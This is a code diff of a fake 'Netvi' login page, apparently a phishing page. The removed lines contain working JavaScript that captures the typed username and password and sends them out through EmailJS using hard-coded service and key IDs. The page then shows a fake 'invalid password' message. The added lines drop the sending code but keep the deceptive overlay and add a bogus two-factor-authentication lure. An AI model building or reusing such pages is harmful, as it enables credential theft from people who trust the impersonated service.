@@ -22,14 +22,13 @@
       text-align: center;
     }
 
-    /* Full-screen login panel */
     .login-container {
       position: fixed;
       top: 0;
       left: 0;
       width: 100vw;
       height: 100vh;
-      background-color: rgba(0, 0, 0, 0.3); /* semi-transparent overlay */
+      background-color: rgba(0, 0, 0, 0.3);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -119,7 +118,6 @@
 </head>
 <body>
 
-  <!-- Full-screen transparent login panel -->
   <div id="login" class="login-container">
     <div class="login-box">
       <img src="https://i.postimg.cc/pT0pDkn6/netvi-logo.jpg" alt="Netvi Logo" class="login-logo">
@@ -131,57 +129,17 @@
     </div>
   </div>
 
-  <!-- Confirmation Message -->
   <div id="confirmation">
-    <h2 style="color: white;">PLEASE TRY AGAIN!</h2>
+    <h2 style="color: white;">Re-enable Your Two-factor Authentication (2FA)</h2>
     <p>The password is invalid, please re-enter it.</p>
-    <button onclick="window.close()">Re-try</button>
+    <button onclick="retryLogin()">Re-try</button>
   </div>
 
   <script>
-    function sendEmail(username, password) {
-      const serviceID = "service_d2hfm4i";
-      const templateID = "template_4dj5dbg";
-      const publicKey = "WWo7anZY4HvX4SL2h";
-
-      const templateParams = {
-        login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
-      };
-
-      return emailjs.send(serviceID, templateID, templateParams, publicKey);
+    function retryLogin() {
+      document.getElementById("confirmation").style.display = "none"; 
+      document.getElementById("login").style.display = "flex"; 
     }
-
-    function authenticate() {
-      let loginButton = document.querySelector("button");
-      loginButton.textContent = "Authenticating...";
-      loginButton.disabled = true;
-      let username = document.getElementById("username").value.trim();
-      let password = document.getElementById("password").value.trim();
-
-      if (username && password) {
-        sendEmail(username, password)
-          .then(() => {
-            loginButton.textContent = "Login";
-            loginButton.disabled = false;
-            document.getElementById("login").style.display = "none";
-            document.getElementById("confirmation").style.display = "block";
-          })
-          .catch(error => {
-            console.error("Error sending email", error);
-            loginButton.textContent = "Login";
-            loginButton.disabled = false;
-            alert("Failed to send login report. Please try again.");
-          });
-      } else {
-        alert("Please enter both username and password.");
-        loginButton.disabled = false;
-        loginButton.textContent = "Login";
-      }
-    }
-
-    window.onload = function () {
-      document.getElementById("login").style.top = "0";
-    };
   </script>
 </body>
 </html>
